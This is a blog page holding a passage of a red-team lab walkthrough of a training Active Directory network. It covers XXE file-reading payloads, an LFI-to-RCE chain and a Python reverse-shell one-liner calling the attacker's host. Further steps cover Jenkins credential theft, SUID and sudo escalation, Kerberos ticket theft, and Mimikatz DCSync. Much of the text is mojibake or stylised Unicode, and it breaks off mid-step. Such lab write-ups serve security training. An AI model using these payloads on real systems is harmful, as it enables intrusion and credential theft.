

  <!DOCTYPE html>
  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
  <style>
    .text1
    {
    text-shadow: 0px 0px 2px #f2f3f2;
    }
    </style>

  

<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/null">
  <link rel="icon" type="image/png" href="/null">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <title>æ”»å‡»é“¾ä¸ƒï¼šåŸŸæ¸—é€æ¡ˆä¾‹å›› - whale3070&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


    <body>
      <header style="height: 70vh;">
        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          
        
      </ul>
    </div>
  </div>
</nav>

          <div class="banner" id="banner" false
            style="background: url('/img/default.png') no-repeat center center;
              background-size: cover;">
              <div class="full-bg-img">
                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
                  <div class="page-header text-center fade-in-up">
                    <span class="h2 text1" id="subtitle" title="æ”»å‡»é“¾ä¸ƒï¼šåŸŸæ¸—é€æ¡ˆä¾‹å››">
                      
                        æ”»å‡»é“¾ä¸ƒï¼šåŸŸæ¸—é€æ¡ˆä¾‹å››
                      
                    </span>
        
                    
                      <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-06-22 14:16" pubdate>
        June 22, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      344 å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      6
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

                    
                  </div>
                    
                  </div>
                  
                </div>
              </div>
          </div>
      </header>

      <main>
        
          

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">æ”»å‡»é“¾ä¸ƒï¼šåŸŸæ¸—é€æ¡ˆä¾‹å››</h1>
            
            <div class="markdown-body">
              <p>Red-teaming Active Directory Lab #3 (ELS.CORP) (Attack Path 2)</p>
<p>Contents<br>Web Server Attack Path (Path 2)</p>
<p>Prod-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>OPS-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>ELS-CHILDDC . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>ELS-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>MGMT-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>JUMP-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>Admin-SYS . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>Scenario<br>You have been asked to execute a (black-box) red teaming exercise against eLS Corp (including any related/trusted forest). The letter of engagement has specified:</p>
<p>The ADMIN-SYS system as the crown jewel. This means that the ultimate goal of this red teaming exercise is to obtain access to the ADMIN-SYS system.</p>
<p>That during this exercise, the web application hosted on 172.16.250.2 is included in the scope and you can exploit it to gain initial foothold</p>
<p>The mail server hosted on 172.16.250.2 is out of scope and should not be touched</p>
<p>That the pentestersâ€™ network range is 172.16.25.0/24 and a static route has been configured so that pentesters can access the 172.16.250.0/24 network range, where eLS Corp assets exist</p>
<p>For any cracking activities use the /usr/share/wordlists/rockyou.txt wordlist, included in latest Kaliâ€™s</p>
<p>Hints<br>Refer to the attack path diagram of page 1 only when you are out of options.</p>
<p>Prod-SRV Server<br>Scanning the accessible IP range from the scope of engagement provides us with two possible entry points both residing on the â€œ172.16.250.2â€ IP. Specifically, scanning the TCP ports of 172.16.250.2 tells us that an SMTP server and a web application are running on TCP ports 25 and 80. According to the letter of engagement, the SMTP server is out of scope.</p>
<p>Accessing port 80 through a web browser reveals that a web service is running with a login/registration</p>
<p>functionality.</p>
<p>Registering and checking the request and response from the portal suggests that XML technology is used to transfer information from the client to the server. Letâ€™s check if the portal is vulnerable to XML External Entity (XXE) attacks.</p>
<p>Using the following XXE payload after capturing the request in the web portal leads to internal file disclosure.</p>
<?xml version="1.0" encoding="UTFâˆ’8"?>
<!DOCTYPE abc [
<!ENTITY ab SYSTEM "file:///etc/passwd">
<p>]&gt;</p>
<p><root><name>&ab;</name><tel>11111111</tel><email><a href="mailto:&#x79;&#x62;&#x40;&#115;&#x71;&#46;&#99;&#x6f;">&#x79;&#x62;&#x40;&#115;&#x71;&#46;&#99;&#x6f;</a></email><password>12345</password></root><br>Through internal file disclosing, sensitive information can easily be obtained (through the XXE vulnerability). For now, we will look for the â€œ/etc/passwdâ€ file.</p>
<p>A local user named â€œprod-adminâ€ is clearly visible in the â€œ/etc/passwdâ€ file, letâ€™s enumerate more to see if we can gain some more information about the discovered user.</p>
<p>Looking at the â€œ.bash_historyâ€ file of the â€œprod-adminâ€ user, another internal file is disclosed which cannot be obtained via directory brute-forcing.</p>
<?xml version="1.0" encoding="UTFâˆ’8"?>
<!DOCTYPE abc [
<!ENTITY ab SYSTEM "file:///home/prod-admin/.bash_history">
<p>]&gt;</p>
<p><root><name>&ab;</name><tel>11111111</tel><email><a href="mailto:&#121;&#98;&#x40;&#x73;&#113;&#x2e;&#99;&#x6f;">&#121;&#98;&#x40;&#x73;&#113;&#x2e;&#99;&#x6f;</a></email><password>12345</password></root><br>The interesting internal files disclosed are located at â€˜/var/www/html/Lab-User.phpâ€™ and â€˜/var/www/Lab-Admin.phpâ€™.</p>
<p>However, we cannot read the files directly, we will use php filter as our workaround to disclose file contents in base64 format and then convert it to a readable format.</p>
<p>The content of the â€œ/var/www/html/Lab-User.phpâ€ file can be viewed, as follows:</p>
<p>Copy the Base64 string from the response body of Burp Suite and then use the following command to read the contents in a readable format.</p>
<p>From the file â€œ/var/www/html/Lab-User.phpâ€ an input parameter â€œpageâ€ is disclosed which can be used to include files as parameters in the URL.</p>
<p>Similarly, the content of the â€œ/var/www/Lab-Admin.phpâ€ file can also be viewed using the PHP filter.</p>
<p>A URL parameter â€˜cmdâ€™ is disclosed for command execution inside â€˜Lab-Admin.phpâ€™</p>
<p>This means that the file â€œLab-User.phpâ€ can be used to include another file and the â€œLab-Admin.phpâ€ file can be used to execute commands.</p>
<p>Command execution can be achieved, as follows.</p>
<p>We have successfully exploited the portal through the below vulnerability chain:</p>
<p>â€œXXE â†’ LFI â†’ RCEâ€</p>
<p>Next step would be to establish a stable reverse shell leveraging RCE for initial access. Use the following command to get a reverse shell from the â€œProd-SRVâ€ server.</p>
<p><a target="_blank" rel="noopener" href="http://172.16.250.2/Lab-User.php?page=../Lab-Admin.php&amp;cmd=python">http://172.16.250.2/Lab-User.php?page=../Lab-Admin.php&amp;cmd=python</a> -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ172.16.25.xâ€,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([â€œ/bin/shâ€,â€-iâ€]);<br>We will be using Metasploit â€œmulti/handlerâ€ module to receive the reverse shell.</p>
<p>use exploit/multi/handler<br>set payload cmd/unix/reverse_python<br>set LHOST <attacking_IP><br>set LPORT <listening_port><br>run -j<br>Reverse shell of Prod-SRV server.</p>
<p>Neat! We have a shell with â€˜www-dataâ€™ privileges. Upgrade the session to stable meterpreter session.</p>
<p>For privilege escalation, â€œwww-dataâ€ user can execute â€œsudoâ€ with â€œviâ€ as prod-admin user, this can be checked &amp; abused as follows:</p>
<p>ğ‘ â„ğ‘’ğ‘™ğ‘™<br>ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› âˆ’ğ‘ â€œğ‘–ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡ ğ‘ğ‘¡ğ‘¦;ğ‘ğ‘¡ğ‘¦.ğ‘ ğ‘ğ‘ğ‘¤ğ‘›(â€˜/ğ‘ğ‘–ğ‘›/ğ‘ğ‘ğ‘ â„â€™);â€<br>ğ‘ ğ‘¢ğ‘‘ğ‘œ âˆ’ğ‘™</p>
<p>&lt;ğ‘…ğ‘’ğ‘ ğ‘¢ğ‘™ğ‘¡&gt;<br>ğ‘ˆğ‘ ğ‘’ğ‘Ÿ ğ‘¤ğ‘¤ğ‘¤âˆ’ğ‘‘ğ‘ğ‘¡ğ‘ ğ‘šğ‘ğ‘¦ ğ‘Ÿğ‘¢ğ‘› ğ‘¡â„ğ‘’ ğ‘“ğ‘œğ‘™ğ‘™ğ‘œğ‘¤ğ‘–ğ‘›ğ‘” ğ‘ğ‘œğ‘šğ‘šğ‘ğ‘›ğ‘‘ğ‘  ğ‘œğ‘› ğ‘ƒğ‘Ÿğ‘œğ‘‘âˆ’ğ‘†ğ‘Ÿğ‘£:<br>(ğ’‘ğ’“ğ’ğ’…âˆ’ğ’‚ğ’…ğ’ğ’Šğ’) /ğ’–ğ’”ğ’“/ğ’ƒğ’Šğ’/ğ’—ğ’Š, ğ‘µğ‘¶ğ‘·ğ‘¨ğ‘ºğ‘ºğ‘¾ğ‘«:ğ‘¨ğ‘³ğ‘³<br>&lt;/ğ‘…ğ‘’ğ‘ ğ‘¢ğ‘™ğ‘¡&gt;</p>
<p>ğ‘ ğ‘¢ğ‘‘ğ‘œ âˆ’ğ‘¢ ğ‘ğ‘Ÿğ‘œğ‘‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘› ğ‘£ğ‘–<br>ğ‘ƒğ‘Ÿğ‘’ğ‘ ğ‘  â€œğ‘¬ğ‘ºğ‘ª +âˆ¶ â€<br>!/ğ‘ğ‘–ğ‘›/ğ‘ â„<br>ğ‘ğ‘ğ‘ â„ âˆ’ğ‘–<br>ğ‘¤â„ğ‘œğ‘ğ‘šğ‘–</p>
<p>&lt;ğ‘…ğ‘’ğ‘ ğ‘¢ğ‘™ğ‘¡&gt;<br>ğ‘·ğ’“ğ’ğ’…âˆ’ğ’‚ğ’…ğ’ğ’Šğ’<br>&lt;/ğ‘…ğ‘’ğ‘ ğ‘¢ğ‘™ğ‘¡&gt;<br>Escalated to â€œprod-adminâ€ user.</p>
<p>However, to move forward we need an internal IP address. Interestingly enough, this machine does not have another interface. If you recall, during enumeration we found that the â€œ.bash_historyâ€ of the prod-admin user contains links to some log files.</p>
<p>The â€œ10.10.2.4â€ IP address can be spotted on the â€œ/var/log/auth.logâ€ file.</p>
<p>Note: if the log is filled, it is automatically shifted to â€œ/var/log/auth.log.1â€ or â€˜/var/log/auth.log.2â€™ and so on, check this too if the IP address is not found.</p>
<p>With the discovered â€œ10.10.2.4â€ IP address we will add a route to the â€œ10.10.2.0/24â€ network and start a socks server.</p>
<p>On meterpreter prompt</p>
<p>ğ‘Ÿğ‘œğ‘¢ğ‘¡ğ‘’ ğ‘ğ‘‘ğ‘‘ 10.10.2.0/24 &lt;ğ‘ ğ‘’ğ‘ ğ‘ ğ‘–ğ‘œğ‘›_ğ¼ğ·&gt;<br>ğ‘Ÿğ‘œğ‘¢ğ‘¡ğ‘’</p>
<p>Start SOCKS server<br>ğ‘¢ğ‘ ğ‘’ ğ‘ğ‘¢ğ‘¥ğ‘–ğ‘™ğ‘–ğ‘ğ‘Ÿğ‘¦/ğ‘ ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿ/ğ‘ ğ‘œğ‘ğ‘˜ğ‘ 4ğ‘<br>ğ‘ â„ğ‘œğ‘¤ ğ‘œğ‘ğ‘¡ğ‘–ğ‘œğ‘›ğ‘ <br>ğ‘ ğ‘’ğ‘¡ ğ‘†ğ‘…ğ‘‰ğ»ğ‘‚ğ‘†ğ‘‡ 172.16.25.ğ‘¥<br>ğ‘ ğ‘’ğ‘¡ ğ‘†ğ‘…ğ‘‰ğ‘ƒğ‘‚ğ‘…ğ‘‡ &lt;ğ‘™ğ‘–ğ‘ ğ‘¡ğ‘’ğ‘›ğ‘–ğ‘›ğ‘”_ğ‘ğ‘œğ‘Ÿğ‘¡&gt;<br>ğ‘Ÿğ‘¢ğ‘› âˆ’ğ‘—</p>
<p>Modify /etc/proxychains.conf<br>ğ‘ ğ‘œğ‘ğ‘˜ğ‘ 4ğ‘ 172.16.25.ğ‘¥ 1080<br>Now, we will scan the TCP ports of the discovered IP address â€œ10.10.2.4â€.</p>
<p>OPS-SRV Server<br>Leveraging the route to the â€œ10.10.2.0/24â€ network and scanning TCP ports using proxychains reveals that a web server is running on 8080.</p>
<p>Open Firefox (or any web browser) with proxychains and point the browser to port 8080 of 10.10.2.4</p>
<p>URL: <a target="_blank" rel="noopener" href="http://10.10.2.4:8080/">http://10.10.2.4:8080</a></p>
<p>A Jenkins server is running with guessable credentials. Specifically, â€œadmin/adminâ€ is a valid set of username/password.</p>
<p>After authentication, it is found that the â€˜adminâ€™ user has view-only rights. Browsing straight to the credentials store, clear text credentials of â€œJenkins-adminâ€ can be been found.</p>
<p>Browse to:<br><a target="_blank" rel="noopener" href="http://10.10.2.4:8080/">http://10.10.2.4:8080</a></p>
<p>Authenticate with:<br>ğ‘ğ‘‘ğ‘šğ‘–ğ‘›/ğ‘ğ‘‘ğ‘šğ‘–ğ‘›</p>
<p>Head straight to the credentials store, the following credentials were found:<br>ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›\ğ´ğ‘‘ğ‘š!ğ‘›@ğ½3ğ‘›ğ‘˜!ğ‘›ğ‘ <br>Logout and login again as â€œjenkins-adminâ€ using the identified credentials.</p>
<p>We can establish a shell with the â€œops-srvâ€ machine by building and executing a malicious task. In order to do so we will use Metasploitâ€™s â€œjenkins_script_consoleâ€ module.</p>
<p>Configure Exploit:<br>ğ‘¢ğ‘ ğ‘’ ğ‘’ğ‘¥ğ‘ğ‘™ğ‘œğ‘–ğ‘¡/ğ‘šğ‘¢ğ‘™ğ‘¡ğ‘–/â„ğ‘¡ğ‘¡ğ‘/ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ _ğ‘ ğ‘ğ‘Ÿğ‘–ğ‘ğ‘¡_ğ‘ğ‘œğ‘›ğ‘ ğ‘œğ‘™ğ‘’<br>ğ‘ ğ‘’ğ‘¡ ğ‘¡ğ‘ğ‘Ÿğ‘”ğ‘’ğ‘¡ 1<br>ğ‘ ğ‘’ğ‘¡ ğ‘‡ğ´ğ‘…ğºğ¸ğ‘‡ğ‘ˆğ‘…ğ¼ /<br>ğ‘ ğ‘’ğ‘¡ ğ‘…ğ‘ƒğ‘‚ğ‘…ğ‘‡ 8080<br>ğ‘ ğ‘’ğ‘¡ ğ‘ˆğ‘†ğ¸ğ‘…ğ‘ğ´ğ‘€ğ¸ ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›<br>ğ‘ ğ‘’ğ‘¡ ğ‘ƒğ´ğ‘†ğ‘†ğ‘Šğ‘‚ğ‘…ğ· ğ´ğ‘‘ğ‘š!ğ‘›@ğ½3ğ‘›ğ‘˜!ğ‘›ğ‘ </p>
<p>Configure Payload:<br>ğ‘ ğ‘’ğ‘¡ ğ‘ğ‘ğ‘¦ğ‘™ğ‘œğ‘ğ‘‘ ğ‘™ğ‘–ğ‘›ğ‘¢ğ‘¥/ğ‘¥86/ğ‘ â„ğ‘’ğ‘™ğ‘™_ğ‘ğ‘–ğ‘›ğ‘‘_ğ‘¡ğ‘ğ‘<br>ğ‘ ğ‘’ğ‘¡ ğ‘Ÿâ„ğ‘œğ‘ ğ‘¡ 10.10.2.4<br>ğ‘ ğ‘’ğ‘¡ ğ‘£ğ‘’ğ‘Ÿğ‘ğ‘œğ‘ ğ‘’ ğ‘¡ğ‘Ÿğ‘¢ğ‘’<br>run<br>Executing the module results in a bind shell on â€œOPS-SRVâ€ server.</p>
<p>Interestingly, this machine is domain joined which can be confirmed through the presence of a â€˜/etc/krb5.confâ€™ file or successful execution of the command â€œkinit -k host/$(hostname -f)â€.</p>
<p>With access to the â€œOPS-SRVâ€ machine we will look for any credentials/tickets that can move us forward. After enumeration, a keytab file is located at â€œ/var/lib/jenkins/support.keytabâ€.</p>
<p>But there is a problemâ€¦ We do not have access to the keytab file because it is owned by another user â€˜opsadminâ€™. We need to somehow become opsadmin or get his privileges.</p>
<p>Hopefully, during some priv-esc enumeration, a file named â€œfindâ€ was found located at â€œ/var/lib/jenkins/findâ€ which has SUID bit set.</p>
<p>Check if OPS-SRV is domain joined or not:<br>ğ‘˜ğ‘–ğ‘›ğ‘–ğ‘¡ âˆ’ğ‘˜ â„ğ‘œğ‘ ğ‘¡/$(â„ğ‘œğ‘ ğ‘¡ğ‘›ğ‘ğ‘šğ‘’ âˆ’ğ‘“)</p>
<p>Keytab file found at:<br>/ğ‘£ğ‘ğ‘Ÿ/ğ‘™ğ‘–ğ‘/ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ /ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡.ğ‘˜ğ‘’ğ‘¦ğ‘¡ğ‘ğ‘</p>
<p>Get opsadmin privileges, SUID check:<br>ğ‘“ğ‘–ğ‘›ğ‘‘ / âˆ’ğ‘ğ‘’ğ‘Ÿğ‘š âˆ’ğ‘¢=ğ‘  âˆ’ğ‘¡ğ‘¦ğ‘ğ‘’ ğ‘“ 2&gt;/ğ‘‘ğ‘’ğ‘£/ğ‘›ğ‘¢ğ‘™ğ‘™<br><Result> /ğ’—ğ’‚ğ’“/ğ’ğ’Šğ’ƒ/ğ’‹ğ’†ğ’ğ’Œğ’Šğ’ğ’”/ğ’‡ğ’Šğ’ğ’… </Result><br>Using the file â€˜findâ€™, we will change the permissions of â€˜support.keytabâ€™ file and request a new ticket.</p>
<p>Escalate to â€œopsadminâ€ user and request a new TGT for support user, as follows.</p>
<p>Escalation to â€œopsadminâ€ user:<br>/ğ‘£ğ‘ğ‘Ÿ/ğ‘™ğ‘–ğ‘/ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ /ğ‘“ğ‘–ğ‘›ğ‘‘ ğ‘ğ‘ âˆ’ğ‘’ğ‘¥ğ‘’ğ‘ ğ‘â„ğ‘šğ‘œğ‘‘ 777 ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡.ğ‘˜ğ‘’ğ‘¦ğ‘¡ğ‘ğ‘ ;</p>
<p>Check the permissions of â€œsupport.keytabâ€ file:<br>ğ‘™ğ‘  âˆ’ğ‘™ğ‘ /ğ‘£ğ‘ğ‘Ÿ/ğ‘™ğ‘–ğ‘/ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ /ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡.ğ‘˜ğ‘’ğ‘¦ğ‘¡ğ‘ğ‘</p>
<p>Request for TGT of support user:<br>ğ‘˜ğ‘–ğ‘›ğ‘–ğ‘¡ âˆ’ğ‘˜ âˆ’ğ‘¡ ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡.ğ‘˜ğ‘’ğ‘¦ğ‘¡ğ‘ğ‘ ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡<br>Permissions of â€œsupport.keytabâ€ file is changed.</p>
<p>Now, with enough permissions a TGT related to the â€œsupportâ€ domain user can be easily obtained. Let us now request a CIFS ticket for the â€œsupportâ€ user, as follows.</p>
<p>To request a CIFS ticket, use the following and export it back to your attacking machine.</p>
<p>Request for CIFS Ticket for support user (On OPS-SRV machine):<br>ğ‘˜ğ‘£ğ‘›ğ‘œ ğ‘ğ‘–ğ‘“ğ‘ /\ğ¸ğ¿ğ‘†âˆ’ğ¶ğ»ğ¼ğ¿ğ·ğ·ğ¶</p>
<p>Convert ticket into base64 (On OPS-SRV machine):<br>ğ‘ğ‘ğ‘ ğ‘’64 /ğ‘¡ğ‘šğ‘/ğ‘˜ğ‘Ÿğ‘5ğ‘ğ‘_123</p>
<p>Copy base64 data and decode in attacker system (On Attacker Machine):<br>ğ‘ğ‘ğ‘ ğ‘’64 âˆ’ğ‘‘ ğ‘˜ğ‘Ÿğ‘5ğ‘ğ‘_123_b64 &gt; /ğ‘¡ğ‘šğ‘/ğ‘˜ğ‘Ÿğ‘5ğ‘ğ‘_123</p>
<p>Set Environment variable on attacker machine:<br>ğ‘’ğ‘¥ğ‘ğ‘œğ‘Ÿğ‘¡ ğ¾ğ‘…ğµ5ğ¶ğ¶ğ‘ğ´ğ‘€ğ¸=/ğ‘¡ğ‘šğ‘/ğ‘˜ğ‘Ÿğ‘5ğ‘ğ‘_123<br>Transferring the ticket using the base64 method and importing it to current environment variable.</p>
<p>CHILD-DC Server<br>Since we have successfully imported a CIFS ticket related to ELS-CHILDDC in our attacking machine, we can connect to the â€œELS-CHILDDCâ€ Domain Controller using the ticket. Also, our meterpreter has a route to the â€œ10.10.2.0/24â€ network.</p>
<p>For that we will use impacketâ€™s psexec script, but first we need to add the IP address of ELS-CHILDDC in our hosts file.</p>
<p>Open /etc/hosts file:<br>10.10.2.2 ğ¸ğ¿ğ‘†âˆ’ğ¶ğ»ğ¼ğ¿ğ·ğ·ğ¶</p>
<p>Using Impacketâ€™s psexec module, connect to ELS-CHILDDC<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› ğ‘ğ‘ ğ‘’ğ‘¥ğ‘’ğ‘. ğ‘ğ‘¦ âˆ’ğ‘˜ âˆ’ğ‘›ğ‘œâˆ’ğ‘ğ‘ğ‘ ğ‘  âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ 10.10.2.2 ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡@ğ¸ğ¿ğ‘†âˆ’ğ¶ğ»ğ¼ğ¿ğ·ğ·ğ¶</p>
<p>NOTE: â€˜-kâ€™ option to use the active Kerberos ticket<br>In short, we are passing the CIFS ticket to the ELS-CHILDDC server from our attacking machine.</p>
<p>This will result in a successful and stable session on the â€˜ELS-CHILDDCâ€™ Domain Controller.</p>
<p>We will also use the â€œPROD-SRVâ€ server to transfer payload from one end to another. Via the meterpreter session on the â€˜PROD-SRVâ€™ server upload â€œMimikatz.exeâ€ and from that download the file to â€œELS-CHILDDCâ€ server.</p>
<p>On PROD-SRV meterpreter session, upload Mimikatz.exe:<br>ğ‘¢ğ‘ğ‘™ğ‘œğ‘ğ‘‘ ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’ /ğ‘¡ğ‘šğ‘/ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’</p>
<p>Start web server to host payload on PROD-SRV server<br>ğ‘ â„ğ‘’ğ‘™ğ‘™<br>ğ‘ğ‘‘ /ğ‘¡ğ‘šğ‘/<br>ğ‘™ğ‘  âˆ’ğ‘™ğ‘ ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’<br>ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› âˆ’ğ‘š ğ‘†ğ‘–ğ‘šğ‘ğ‘™ğ‘’ğ»ğ‘‡ğ‘‡ğ‘ƒğ‘†ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿ 8888</p>
<p>With Active psexec session on ELS-CHILDDC, download the payload:<br>ğ‘ğ‘œğ‘¤ğ‘’ğ‘Ÿğ‘ â„ğ‘’ğ‘™ğ‘™.ğ‘’ğ‘¥ğ‘’ ğ¼ğ‘›ğ‘£ğ‘œğ‘˜ğ‘’âˆ’ğ‘Šğ‘’ğ‘ğ‘…ğ‘’ğ‘ğ‘¢ğ‘’ğ‘ ğ‘¡ âˆ’ğ‘ˆğ‘…ğ¼ â„ğ‘¡ğ‘¡ğ‘://172.16.250.2:8888/ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’ âˆ’ğ‘‚ğ‘¢ğ‘¡ğ¹ğ‘–ğ‘™ğ‘’ ğ¶:\ğ‘ˆğ‘ ğ‘’ğ‘Ÿğ‘ \ğ‘ƒğ‘¢ğ‘ğ‘™ğ‘–ğ‘\ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡.ğ‘’ğ‘¥ğ‘’<br>Upload Mimikatz.exe:</p>
<p>Start Python server on â€œPROD-SRVâ€ server: -</p>
<p>Downloading, Mimikatz.exe on â€œELS-CHILDDCâ€ Domain Controller.</p>
<p>Our payload is successfully transferred to Child Domain Controller. Now let us forge a golden ticket to escalate to Enterprise Admins of the parent domain.</p>
<p>However, we will need, the following:</p>
<p>Krbtgt hash of child DC</p>
<p>Child Domin SID</p>
<p>Parent Domain SID</p>
<p>Current Domain FQDN</p>
<p>To extract the krbtgt NTLM hash of the â€œels-childdcâ€ domain, we will perform a DCSync attack.</p>
<p>ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’<br>ğ‘™ğ‘ ğ‘ğ‘‘ğ‘¢ğ‘šğ‘::ğ‘‘ğ‘ğ‘ ğ‘¦ğ‘›ğ‘ /ğ‘¢ğ‘ ğ‘’ğ‘Ÿ:ğ‘’ğ‘™ğ‘ âˆ’ğ‘â„ğ‘–ğ‘™ğ‘‘\ğ‘˜ğ‘Ÿğ‘ğ‘¡ğ‘”ğ‘¡</p>
<Result>
